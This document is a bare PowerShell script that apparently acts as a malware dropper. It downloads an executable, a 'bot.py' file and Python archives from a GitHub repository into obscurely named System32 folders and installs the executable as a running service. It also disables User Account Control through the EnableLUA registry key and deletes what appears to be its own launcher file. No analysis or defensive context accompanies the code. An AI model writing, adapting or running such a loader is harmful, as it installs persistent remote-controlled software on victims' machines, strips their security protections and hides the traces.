$destino = 'C:\Windows\System32\Int-service.exe'
$destino2 = 'C:\Windows\System32\ap32\log.py'
$destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
$destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
$destino5 = 'C:\Windows\System32\ap32\scripts.zip'
$destino6 = 'C:\Windows\System32\Int-service.xml'

if (Test-Path "C:\Windows\System32\re-as") {
    Remove-Item "C:\Windows\System32\re-as" -Recurse -Force
}

if (Test-Path "C:\Windows\System32\ap32") {
    Remove-Item "C:\Windows\System32\ap32" -Recurse -Force
}

if (Test-Path "C:\Windows\System32\Int-service.exe") {
    Remove-Item "C:\Windows\System32\Int-service.exe" -Force
}

if (Test-Path "C:\Windows\System32\Int-service.xml") {
    Remove-Item "C:\Windows\System32\Int-service.xml" -Force
}

New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory

Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/Int-service.exe?dl=1" -OutFile $destino
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/Int-service.xml?dl=1" -OutFile $destino6

Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\re-as" -Force
Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\re-as" -Force
Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32" -Force

Copy-Item -Path "C:\Windows\System32\ap32\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force

Remove-Item "C:\Windows\System32\re-as\WPy64.zip" -Force
Remove-Item "C:\Windows\System32\re-as\WPy64_2.zip" -Force
Remove-Item "C:\Windows\System32\ap32\scripts.zip" -Force
Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force

C:\Windows\System32\Int-service.exe install
C:\Windows\System32\Int-service.exe start

New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

if (Test-Path "C:\Windows\go.ps1") {
    Remove-Item "C:\Windows\go.ps1" -Force
}

exit


